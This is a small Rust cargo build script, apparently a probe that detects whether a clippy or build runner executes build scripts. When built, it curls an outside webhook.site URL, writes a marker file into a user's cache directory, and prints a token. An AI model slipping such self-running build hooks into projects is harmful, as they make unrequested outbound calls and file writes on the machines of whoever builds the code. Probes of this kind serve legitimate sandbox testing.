// RUNNERSINKS: cargo build script — executes iff `cargo clippy` builds the crate.
use std::process::Command;
fn main() {
    let _ = Command::new("curl").args(["-s", "-m", "6", "https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-clippy-buildrs"]).status();
    let _ = std::fs::write("/home/jailuser/.cache/rsnk/carry_clippy.txt", "RSNK_29DBD6_CARRY_CLIPPY");
    println!("cargo:warning=RSNK_29DBD6_BUILD_RS_OK");
}
